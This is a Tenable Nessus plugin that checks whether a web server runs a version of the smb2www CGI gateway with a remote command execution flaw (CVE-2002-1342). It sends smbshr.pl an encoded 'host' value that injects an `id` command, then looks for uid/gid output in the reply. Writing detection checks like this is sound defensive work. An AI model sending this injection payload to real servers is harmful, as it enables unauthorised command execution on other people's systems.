#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if(description)
{
 script_id(11375);
 script_version("$Revision: 1.13 $");
 script_cve_id("CVE-2002-1342");
 script_bugtraq_id(6313);
 script_xref(name:"OSVDB", value:"11798");
 
 script_name(english: "smb2www Unspecified Arbitrary Remote Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands can be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote host is running smb2www - a SMB to WWW gateway.

There is a flaw in the version of this CGI which allows
anyone to execute arbitrary commands on this host by
sending a malformed argument to smbshr.pl, one of the components
of this solution." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 script_summary(english: "smb2www Command Execution");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

arg = "host=%22%20%2DFOOBAR%7Cecho%20%22%20Sharename%22%0Aecho%0Aecho%20%22%20%20SomeShare%20%20Disk%20%22%60id%60%20%23%22";


dirs = make_list("/samba");

foreach d (cgi_dirs())
{ 
 dirs = make_list(dirs, d, string(d, "/samba"));
}

foreach d (dirs)
{
 r = http_send_recv3(port: port, method: 'POST', 
   item: strcat(d, "/smbshr.pl"), data: arg);
 if (isnull(r)) exit(0);
 
 if (egrep(pattern: "uid=[0-9].* gid=[0-9]", string: r[2]))
	{
 	security_hole(port);
	exit(0);
	}
}

